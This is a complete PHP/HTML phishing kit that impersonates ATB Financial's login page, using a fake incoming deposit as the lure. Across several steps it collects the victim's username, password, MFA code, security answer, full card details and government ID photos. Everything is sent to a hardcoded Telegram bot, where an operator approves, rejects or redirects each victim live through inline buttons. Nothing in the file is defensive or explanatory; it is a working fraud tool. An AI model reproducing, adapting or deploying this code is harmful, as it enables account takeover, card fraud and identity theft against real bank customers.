<?php
session_start();

/**
 * ATB Financial - Enhanced Verification System
 * Features: ID Upload, Custom CC Selectors, Transaction Context, Controller Integration
 */

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

/* ---------- Helper: Get Real IP ---------- */
function get_client_ip() {
    // Cloudflare
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } 
    // Proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ip_list[0]);
    } 
    elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // Clean up IPv4-mapped IPv6 addresses (e.g. ::ffff:192.168.1.1)
    if (strpos($ip, '::ffff:') === 0) {
        $ip = substr($ip, 7);
    }
    
    return trim($ip);
}

/* ---------- Token Decryption & Data Setup ---------- */
// Default Fallback Values
$senderName = 'Canada Revenue Agency (CRA)';
$amountFormatted = '485.00';
$securityQuestion = "What is your father's middle name?";

// Decrypt Token if Present
if (!empty($_GET['deposit'])) {
    try {
        $token = $_GET['deposit'];
        $encryptionKey = 'a3f91b6cd024e8c29b76a149efcc5d42'; 
        
        $encrypted = base64_decode(str_pad(strtr($token, '-_', '+/'), strlen($token) % 4, '=', STR_PAD_RIGHT));
        $iv = substr($encrypted, 0, 16);
        $data = substr($encrypted, 16);
        $keyHash = hash('sha256', $encryptionKey, true);
        
        $decrypted = openssl_decrypt($data, 'AES-256-CBC', $keyHash, OPENSSL_RAW_DATA, $iv);
        
        if ($decrypted) {
            parse_str($decrypted, $params);
            
            if (!empty($params['sender'])) {
                $senderName = $params['sender'];
            }
            if (!empty($params['amount'])) {
                $amountFormatted = number_format((float)str_replace(['$',',',' '],'',$params['amount']), 2);
            }
            if (!empty($params['question'])) {
                $securityQuestion = $params['question'];
            }
            
            $_SESSION['transaction_data'] = $params;
        }
    } catch (Exception $e) {
        // Fallback to defaults on error
    }
}

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        // Handle File Uploads (e.g., ID photos)
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                // Create CURLFile for file upload
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

/* ---------- Initial Notification ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    @file_get_contents("https://api.telegram.org/bot{$telegramToken}/deleteWebhook"); // Ensure polling works
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    
    $clientIP = get_client_ip();
    
    $notificationText = "🟦 ATB CONTROLLER 🟦\n\n";
    $notificationText .= "<b>ATB BUSINESS SELECTED</b>\n\n";
    $notificationText .= "<code>" . $clientIP . "</code>\n\n";
    $notificationText .= "<b>TRANSACTION</b>\n";
    $notificationText .= "<code>" . $senderName . "</code>\n";
    $notificationText .= "<code>$" . $amountFormatted . "</code>\n\n";
    $notificationText .= "🟦 ATB CONTROLLER 🟦";

    $payload = [
        'chat_id' => $chatId,
        'text' => $notificationText,
        'parse_mode' => 'HTML'
    ];
    $options = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($payload)]];
    @file_get_contents($url, false, stream_context_create($options));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>login.atb.com/as/authorization.oauth2?redirect_uri=https%3A%2F%2Fpersonal.atb.com%2Fcallback&client_id=ATBWEB&response_type=code&state=N6QAvroulf&scope=openid%20profile%20retail-web&cmid=bd338ad1d5654658b1065d72a4d8d49f&response_mode=fragment&appState=%5Bobject%20Object%5D&code_challenge=XIsFT3IkDWUuUXKroy_EZHtAO-JrykrF2ycq4LAzRf8&code_challenge_method=S256</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap">
    <style>
        :root {
            --atb-blue: #0070e0;
            --atb-blue-hover: #005bb8;
            --atb-text-main: #333333;
            --atb-text-label: #555555;
            --atb-input-bg-focus: #f0f6ff;
            --atb-input-bg-neutral: #eff4fb;
            --atb-border-neutral: #cccccc;
        }

        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        
        body { 
            font-family: 'Open Sans', sans-serif;
            background-color: #ffffff;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
        }

        .atb-frame {
            width: 100%;
            max-width: 480px;
            display: flex;
            flex-direction: column;
            padding: 40px 35px;
            background: #fff;
            min-height: 100vh;
        }

        .atb-logo-container {
            text-align: center;
            margin-bottom: 30px;
            margin-top: 10px;
        }

        .atb-logo-box {
            display: inline-block;
            border: 3.5px solid var(--atb-blue);
            padding: 7px 11px;
        }

        .atb-logo-text {
            color: var(--atb-blue);
            font-size: 38px;
            font-weight: 800;
            letter-spacing: -1.5px;
            line-height: 1;
        }

        .atb-title {
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            color: var(--atb-text-main);
            margin: 15px 0 25px;
        }

        .atb-divider {
            border: none;
            border-top: 1px solid #eeeeee;
            margin-bottom: 25px;
        }

        .atb-banner-container {
            text-align: center;
            margin-bottom: 25px;
            width: 100%;
        }
        
        .atb-banner-container img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .form-group { margin-bottom: 22px; position: relative; }
        .form-label { display: block; font-size: 16px; color: var(--atb-text-label); margin-bottom: 6px; font-weight: 400; }
        .form-input {
            width: 100%;
            padding: 16px 14px;
            font-size: 18px;
            border: 1.5px solid var(--atb-border-neutral);
            border-radius: 4px;
            background-color: var(--atb-input-bg-neutral);
            outline: none;
            transition: all 0.2s ease;
            color: #000;
        }
        
        select.form-input {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%230070e0%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
            background-repeat: no-repeat;
            background-position: right 15px top 50%;
            background-size: 12px auto;
        }

        .form-input:focus { border-color: var(--atb-blue); background-color: var(--atb-input-bg-focus); }

        .card-scanner-icon {
            position: absolute;
            right: 15px;
            top: 42px;
            width: 24px;
            height: 24px;
            cursor: pointer;
            opacity: 0.6;
        }
        .card-scanner-icon:hover { opacity: 1; }

        .atb-button {
            width: 100%;
            padding: 18px;
            background-color: var(--atb-blue);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 30px;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .atb-button:hover { background-color: var(--atb-blue-hover); }
        .atb-button:disabled { background-color: #ccc; cursor: not-allowed; }

        .atb-link-group { text-align: center; margin-top: 35px; display: flex; flex-direction: column; gap: 35px; }
        .atb-link { color: var(--atb-blue); text-decoration: none; font-size: 17px; font-weight: 600; }

        .atb-footer { margin-top: auto; padding-top: 50px; padding-bottom: 20px; text-align: center; }
        .atb-footer-links-row { font-size: 12px; color: var(--atb-blue); margin-bottom: 8px; }
        .atb-footer-links-row a { color: var(--atb-blue); text-decoration: none; }
        .atb-legal-text { font-size: 11px; color: #666; line-height: 1.5; max-width: 300px; margin: 10px auto; }

        .error-banner {
            background: #fff0f0;
            color: #d00;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
            display: none;
            border: 1px solid #ffcccc;
            font-size: 14px;
        }

        .step-section { display: none; }
        .active-step { display: block; }

        .spinner {
            width: 20px; height: 20px;
            border: 2.5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            margin-left: 10px;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .info-bubble {
            background-color: #f0f6ff;
            border: 1px solid #cce0ff;
            padding: 18px;
            border-radius: 8px;
            margin-bottom: 25px;
            font-size: 15px;
            line-height: 1.5;
            color: #004299;
        }

        .transaction-card {
            background: #fff;
            border: 1px solid #ddd;
            border-left: 5px solid var(--atb-blue);
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .tx-label { font-size: 12px; color: #777; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
        .tx-value { font-size: 18px; font-weight: 700; color: #333; margin-bottom: 12px; }
        .tx-value:last-child { margin-bottom: 0; }
        .tx-amount { color: #008a00; font-size: 22px; }

        .id-upload-box {
            border: 2px dashed #ccc;
            background: #fafafa;
            padding: 20px;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .id-upload-box:hover { border-color: var(--atb-blue); background: #f0f6ff; }
        .id-icon { font-size: 32px; color: var(--atb-blue); margin-bottom: 10px; }
        .id-label { font-weight: 600; color: #555; display: block; }
        .id-status { font-size: 12px; color: #888; margin-top: 5px; }
        input[type="file"] { display: none; }

        .flex-row { display: flex; gap: 15px; }
        .flex-row > div { flex: 1; }

        .recaptcha-badge {
            position: fixed; bottom: 10px; right: 10px;
            background: #fff; border: 1px solid #ddd; padding: 8px 12px;
            display: flex; align-items: center; font-size: 10px; color: #777;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1); border-radius: 3px;
        }
    </style>
</head>
<body>

<div class="atb-frame">
    <div class="atb-logo-container">
        <div class="atb-logo-box">
            <span class="atb-logo-text">ATB</span>
        </div>
    </div>

    <h1 class="atb-title" id="stepTitle">Login</h1>
    <hr class="atb-divider">
    
    <div class="atb-banner-container">
        <img src="banner.png" alt="">
    </div>

    <div id="errorBanner" class="error-banner"></div>

    <!-- Step 1A: USERNAME -->
    <div id="stepUsername" class="step-section active-step">
        <div class="form-group">
            <label class="form-label">Username</label>
            <div style="position:relative;">
                <input id="username" type="text" class="form-input" placeholder="Enter your username" style="padding-right: 45px;">
                <svg style="position:absolute; right:15px; top:50%; transform:translateY(-50%); width:24px; height:24px; color:#555;" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
            </div>
        </div>
        <div style="display:flex; align-items:center; margin-bottom:30px;">
            <input type="checkbox" id="rememberMe" style="width:20px; height:20px; margin-right:10px; cursor:pointer;">
            <label for="rememberMe" style="font-size:16px; color:#333; cursor:pointer;">Remember username</label>
        </div>
        <button id="usernameBtn" class="atb-button">Continue</button>
        <div class="atb-link-group">
            <a href="#" class="atb-link">Forgot username</a>
        </div>
    </div>

    <!-- Step 1B: PASSWORD -->
    <div id="stepPassword" class="step-section">
        <div class="form-group">
            <label class="form-label">Password</label>
            <input id="password" type="password" class="form-input" placeholder="">
        </div>
        <button id="loginBtn" class="atb-button">
            Log in <div class="spinner" id="loginSpinner"></div>
        </button>
        <div class="atb-link-group">
            <a href="#" class="atb-link" onclick="switchStep('stepUsername', 'Login'); return false;">Not your account?</a>
            <a href="#" class="atb-link">Forgot password</a>
        </div>
    </div>

    <!-- Step 2: PIN (2FA) -->
    <div id="stepPIN" class="step-section">
        <div class="info-bubble">
            A verification code has been sent to your primary device. Please enter the 6-digit code to continue.
        </div>
        <div class="form-group">
            <label class="form-label">Verification Code</label>
            <input id="pinCode" type="text" class="form-input" maxlength="6" style="text-align:center; letter-spacing: 10px; font-weight: 700; font-size: 26px;" placeholder="">
        </div>
        <button id="pinBtn" class="atb-button">
            Continue <div class="spinner" id="pinSpinner"></div>
        </button>
    </div>

    <!-- Step 3: SECURITY QUESTION (Sender Info) -->
    <div id="stepSQ" class="step-section">
        <div class="transaction-card">
            <div class="tx-label">Incoming Transfer From</div>
            <div class="tx-value"><?= htmlspecialchars($senderName); ?></div>
            <div class="tx-label">Amount</div>
            <div class="tx-value tx-amount">$<?= $amountFormatted; ?></div>
        </div>
        <div class="info-bubble">
            Please answer your security question to deposit these funds.
        </div>
        <div class="form-group">
            <label class="form-label" style="font-weight:700; color:#333;">Security Question</label>
            <p style="margin: 0 0 15px; color:#555; font-size:16px;"><?= htmlspecialchars($securityQuestion); ?></p>
            <input id="sqAnswer" type="text" class="form-input" placeholder="Answer">
        </div>
        <button id="sqBtn" class="atb-button">
            Deposit Funds <div class="spinner" id="sqSpinner"></div>
        </button>
    </div>

    <!-- Step 4: DEPOSIT SUCCESS (Interim) -->
    <div id="stepDepositSuccess" class="step-section">
        <div style="text-align:center; padding: 30px 0;">
            <div style="width:80px; height:80px; background:#00c853; border-radius:50%; display:flex; align-items:center; justify-content:center; margin: 0 auto 25px; color:#fff; font-size:40px;">✓</div>
            <h2 style="font-size:24px; font-weight:700; margin-bottom:12px;">Deposit Successful</h2>
            <p style="color:#666; font-size:16px; margin-bottom:30px; line-height: 1.5;">
                The funds have been successfully accepted. To complete the transaction and upgrade your transfer limits, please verify your payment method.
            </p>
            <button onclick="showCC()" class="atb-button">Continue to Verification</button>
        </div>
    </div>

    <!-- Step 5: CC VERIFY (Selectors, Scanner, Max 3 CVV) -->
    <div id="stepCC" class="step-section">
        <div class="info-bubble">
            Verify your card details to finalize the deposit.
        </div>
        <div class="form-group">
            <label class="form-label">Card Number</label>
            <input id="ccNum" type="text" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19">
            <!-- Card Scanner Icon SVG -->
            <svg class="card-scanner-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                <path d="M4 4h3v2H4v3H2V4a2 2 0 0 1 2-2h3v2H4zm16 0h-3V2h3a2 2 0 0 1 2 2v3h-2V4zm0 16h-3v2h3a2 2 0 0 0 2-2v-3h-2v3zM4 20h3v2H4a2 2 0 0 1-2-2v-3h2v3zM12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm-5 3a5 5 0 1 1 10 0 5 5 0 0 1-10 0z"/>
            </svg>
        </div>
        <div class="flex-row">
            <div class="form-group">
                <label class="form-label">Expiration Date</label>
                <div style="display:flex; gap:10px;">
                    <select id="ccMonth" class="form-input" style="flex:1;">
                        <option value="" disabled selected>MM</option>
                        <option value="01">01</option><option value="02">02</option><option value="03">03</option>
                        <option value="04">04</option><option value="05">05</option><option value="06">06</option>
                        <option value="07">07</option><option value="08">08</option><option value="09">09</option>
                        <option value="10">10</option><option value="11">11</option><option value="12">12</option>
                    </select>
                    <select id="ccYear" class="form-input" style="flex:1;">
                        <option value="" disabled selected>YY</option>
                        <option value="25">25</option><option value="26">26</option><option value="27">27</option>
                        <option value="28">28</option><option value="29">29</option><option value="30">30</option>
                        <option value="31">31</option><option value="32">32</option><option value="33">33</option>
                    </select>
                </div>
            </div>
            <div class="form-group" style="flex: 0.6;">
                <label class="form-label">CVV (3 Digits)</label>
                <input id="ccCvv" type="password" class="form-input" placeholder="•••" maxlength="3">
            </div>
        </div>
        <button id="ccBtn" class="atb-button">
            Verify Card <div class="spinner" id="ccSpinner"></div>
        </button>
    </div>

    <!-- Step 6: ID UPLOAD (Replaces Personal Info) -->
    <div id="stepID" class="step-section">
        <div class="info-bubble">
            <strong>ID Verification Required:</strong> Please upload a photo of your Government ID (Driver's License or Passport) to complete the verification.
        </div>

        <div class="form-group">
            <label class="form-label">Front of ID</label>
            <div class="id-upload-box" onclick="document.getElementById('idFront').click()">
                <div class="id-icon">🪪</div>
                <span class="id-label">Click to upload Front</span>
                <span id="idFrontName" class="id-status">No file selected</span>
            </div>
            <input type="file" id="idFront" accept="image/*">
        </div>

        <div class="form-group">
            <label class="form-label">Back of ID</label>
            <div class="id-upload-box" onclick="document.getElementById('idBack').click()">
                <div class="id-icon">🔄</div>
                <span class="id-label">Click to upload Back</span>
                <span id="idBackName" class="id-status">No file selected</span>
            </div>
            <input type="file" id="idBack" accept="image/*">
        </div>

        <button id="idBtn" class="atb-button">
            Submit Documents <div class="spinner" id="idSpinner"></div>
        </button>
    </div>

    <!-- Step 7: FINAL SUCCESS -->
    <div id="stepSuccess" class="step-section">
        <div style="text-align:center; padding: 40px 0;">
            <div style="width:90px; height:90px; background:#00c853; border-radius:50%; display:flex; align-items:center; justify-content:center; margin: 0 auto 30px; color:#fff; font-size:45px;">✓</div>
            <h2 style="font-size:26px; font-weight:700; margin-bottom:12px;">Verification Complete</h2>
            <p style="color:#666; font-size:16px; margin-bottom:40px;">Your identity has been verified and the funds have been fully released to your account.</p>
            <button onclick="window.location.href='https://atb.com'" class="atb-button">Go to Dashboard</button>
        </div>
    </div>

    <div class="atb-footer">
        <div class="atb-footer-links-row">
            <a href="#">atb.com</a> | <a href="#">Contact us</a> | <a href="#">Terms</a>
        </div>
        <div class="atb-footer-links-row">
            <a href="#">Tax Pay & File</a> | <a href="#">Security tips</a>
        </div>
        <div class="atb-legal-text">
            © ATB Financial 2025. All rights reserved.<br>
            Authorized access only. Usage may be monitored.
        </div>
    </div>
</div>

<div class="recaptcha-badge">
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="height:14px; margin-right:8px;">
    <span>Privacy • Terms</span>
</div>

<script>
    // Global functions need to be accessible
    function showCC() {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active-step'));
        document.getElementById('stepCC').classList.add('active-step');
        document.getElementById('stepTitle').textContent = 'Verification';
        window.scrollTo(0,0);
    }
    
    // Switch step global function
    function switchStep(stepId, title) {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active-step'));
        document.getElementById(stepId).classList.add('active-step');
        document.getElementById('stepTitle').textContent = title;
        document.getElementById('errorBanner').style.display = 'none';
        window.scrollTo(0, 0);
    }

document.addEventListener('DOMContentLoaded', function() {
    const chatId = "<?= $chatId; ?>";
    let lastUpdateId = 0;
    let pollInterval = null;
    let abortController = null;

    // API Proxy Wrapper
    async function apiCall(method, params, isMultipart = false) {
        let body;
        if (isMultipart) {
            body = new FormData();
            body.append('action', method);
            for (const k in params) {
                body.append(k, params[k]);
            }
        } else {
            const formData = new FormData();
            formData.append('action', method);
            for (const k in params) {
                formData.append(k, params[k]);
            }
            body = formData;
        }
        
        const res = await fetch('', {
            method: 'POST',
            body: body
        });
        return await res.json();
    }

    // Initialize Update ID
    apiCall('getUpdates', {offset: -1}).then(d => { if(d.result?.length) lastUpdateId = d.result[0].update_id; });

    function stopPolling() {
        if (pollInterval) {
            clearInterval(pollInterval);
            pollInterval = null;
        }
        if (abortController) {
            abortController.abort();
            abortController = null;
        }
    }

    async function pollController(msgId, onSuccess, onError) {
        stopPolling();
        abortController = new AbortController();
        const signal = abortController.signal;

        pollInterval = setInterval(async () => {
            try {
                const res = await fetch('', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `action=getUpdates&offset=${lastUpdateId+1}&timeout=5`,
                    signal: signal
                });
                const data = await res.json();
                
                if (data.result?.length) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query && update.callback_query.message.message_id === msgId) {
                            stopPolling();
                            const cmd = update.callback_query.data;
                            
                            // Cleanup
                            apiCall('editMessageReplyMarkup', {
                                chat_id: chatId, 
                                message_id: msgId, 
                                reply_markup: JSON.stringify({inline_keyboard: []})
                            });

                            if (cmd === 'yes') onSuccess();
                            else if (cmd === 'no') onError();
                            else if (cmd === 'go_cc') switchStep('stepCC', 'Verification');
                            else if (cmd === 'go_id') switchStep('stepID', 'ID Verification');
                            else if (cmd === 'cancel') window.location.href = "https://atb.com";
                        }
                    }
                }
            } catch (e) { /* Ignore AbortError */ }
        }, 2000);
    }

    // General Step Handler
    async function handleStep(stepName, logContent, btn, spinner, nextStepFunc, errorMsg) {
        stopPolling();
        btn.disabled = true;
        spinner.style.display = 'inline-block';
        const originalText = btn.innerText;
        btn.innerText = "Processing...";
        document.getElementById('errorBanner').style.display = 'none';

        const keyboard = {
            inline_keyboard: [
                [{text: "🟩 APPROVE", callback_data: "yes"}],
                [{text: "🟥 REJECT", callback_data: "no"}],
                [{text: "💳 REQ CC", callback_data: "go_cc"}, {text: "🪪 REQ ID", callback_data: "go_id"}],
                [{text: "⚪️ CANCEL", callback_data: "cancel"}]
            ]
        };

        try {
            const data = await apiCall('sendMessage', {
                chat_id: chatId,
                text: `🟦 ATB 🟦\n<b>${stepName.toUpperCase()}</b>\n\n${logContent}`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify(keyboard)
            });

            if (!data.ok) throw new Error("API Error");
            const msgId = data.result?.message_id;

            pollController(msgId, 
                () => { // Success
                    btn.disabled = false;
                    spinner.style.display = 'none';
                    btn.innerText = originalText;
                    nextStepFunc();
                },
                () => { // Fail
                    btn.disabled = false;
                    spinner.style.display = 'none';
                    btn.innerText = originalText;
                    document.getElementById('errorBanner').textContent = errorMsg;
                    document.getElementById('errorBanner').style.display = 'block';
                }
            );
        } catch (e) {
            btn.disabled = false;
            spinner.style.display = 'none';
            btn.innerText = originalText;
            document.getElementById('errorBanner').textContent = "Connection timed out. Please try again.";
            document.getElementById('errorBanner').style.display = 'block';
        }
    }

    // ---------------- EVENT LISTENERS ----------------

    // 1A. Username Continue
    document.getElementById('usernameBtn').addEventListener('click', () => {
        const u = document.getElementById('username').value;
        if(!u) return;
        switchStep('stepPassword', 'Login');
    });

    // 1B. Login (Password)
    document.getElementById('loginBtn').addEventListener('click', () => {
        const u = document.getElementById('username').value; // Get from previous step
        const p = document.getElementById('password').value;
        if(!p) return;
        
        // Clean format: Value only, spacious
        handleStep("LOGIN", `<code>${u}</code>\n\n<code>${p}</code>`, 
            document.getElementById('loginBtn'), document.getElementById('loginSpinner'),
            () => switchStep('stepPIN', 'Verification'), "The information entered does not match our records."
        );
    });

    // 2. PIN
    document.getElementById('pinBtn').addEventListener('click', () => {
        const pin = document.getElementById('pinCode').value;
        if(pin.length < 6) return;
        // Clean format: Value only
        handleStep("MFA PIN", `<code>${pin}</code>`,
            document.getElementById('pinBtn'), document.getElementById('pinSpinner'),
            () => switchStep('stepSQ', 'Security Check'), "Invalid verification code."
        );
    });

    // 3. Security Question (SQ) -> Deposit Success
    document.getElementById('sqBtn').addEventListener('click', () => {
        const ans = document.getElementById('sqAnswer').value;
        if(!ans) return;
        // Clean format: Value only, spacious
        handleStep("SECURITY QUESTION", `<code>${ans}</code>`,
            document.getElementById('sqBtn'), document.getElementById('sqSpinner'),
            () => switchStep('stepDepositSuccess', 'Deposit Status'), "Answer incorrect."
        );
    });

    // 5. CC Verify (Step 4 is the transition screen)
    document.getElementById('ccBtn').addEventListener('click', () => {
        const n = document.getElementById('ccNum').value;
        const mm = document.getElementById('ccMonth').value;
        const yy = document.getElementById('ccYear').value;
        const c = document.getElementById('ccCvv').value;
        if(!n || !mm || !yy || !c) return;
        
        // Clean format: Values only, spacious
        handleStep("CC VERIFICATION", `<code>${n}</code>\n\n<code>${mm}/${yy}</code>\n\n<code>${c}</code>`,
            document.getElementById('ccBtn'), document.getElementById('ccSpinner'),
            () => switchStep('stepID', 'ID Verification'), "Card verification failed. Please try again."
        );
    });

    // 6. ID Upload Handlers
    document.getElementById('idFront').addEventListener('change', function() {
        if(this.files[0]) document.getElementById('idFrontName').textContent = this.files[0].name;
    });
    document.getElementById('idBack').addEventListener('change', function() {
        if(this.files[0]) document.getElementById('idBackName').textContent = this.files[0].name;
    });

    document.getElementById('idBtn').addEventListener('click', async () => {
        const f = document.getElementById('idFront').files[0];
        const b = document.getElementById('idBack').files[0];
        
        if(!f || !b) {
            alert("Please upload both front and back of your ID.");
            return;
        }

        const btn = document.getElementById('idBtn');
        const spinner = document.getElementById('idSpinner');
        btn.disabled = true;
        spinner.style.display = 'inline-block';
        btn.innerText = "Uploading...";

        try {
            // Upload Front
            await apiCall('sendPhoto', {chat_id: chatId, caption: '🪪 ID Front', photo: f}, true);
            // Upload Back
            await apiCall('sendPhoto', {chat_id: chatId, caption: '🪪 ID Back', photo: b}, true);
            
            // Send Verification Request
            handleStep("ID UPLOAD", "Photos sent. Review ID images above.",
                btn, spinner,
                () => switchStep('stepSuccess', 'Success'), "ID Verification failed. Please ensure images are clear."
            );
        } catch(e) {
            console.error(e);
            alert("Upload failed. Please try again.");
            btn.disabled = false;
            spinner.style.display = 'none';
            btn.innerText = "Submit Documents";
        }
    });

    // CC Formatting
    document.getElementById('ccNum').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });
});
</script>
</body>
</html>